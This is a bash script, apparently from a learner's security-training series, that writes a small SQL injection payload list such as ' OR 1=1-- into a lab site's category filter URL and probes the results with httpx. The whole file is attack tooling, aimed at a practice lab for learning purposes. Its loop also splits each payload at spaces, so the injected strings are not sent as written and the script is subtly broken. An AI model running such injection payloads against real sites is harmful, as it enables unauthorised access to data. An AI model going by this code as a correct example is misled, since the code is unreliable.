#!/bin/bash

# ===============================
# Day 17 - Basic SQL Injection Lab (WHERE clause bypass)
# Lab URL: https://0ae9001504df54c780b280f4008c0024.web-security-academy.net/
# Goal: Bypass `released = 1` filter to show unreleased products (released = 0)
# ===============================

LAB_URL="https://0ae9001504df54c780b280f4008c0024.web-security-academy.net/"
OUTPUT_FILE="day17-sqli-results.txt"
PAYLOADS_FILE="day17-sqli-payloads.txt"

echo "[*] Creating SQLi payload list..."
cat > "$PAYLOADS_FILE" <<EOF
' OR 1=1--
' OR released = 1--
' OR released = 0--
EOF

echo "[*] Generating test URLs with payloads..."
> temp-urls.txt
for payload in $(cat $PAYLOADS_FILE); do
  # URL encode the payload
  encoded_payload=$(echo "$payload" | jq -sRr @uri)
  echo "${LAB_URL}filter?category=${encoded_payload}" >> temp-urls.txt
done

echo "[*] Testing URLs with httpx and capturing HTTP 200 responses..."
cat temp-urls.txt | httpx -mc 200 -title -web-server -o "$OUTPUT_FILE"

echo "[*] Results stored in: $OUTPUT_FILE"
echo "Day 17 - $(date): Ran SQLi WHERE bypass lab. Checked $(wc -l < temp-urls.txt) payloads." >> progress.log
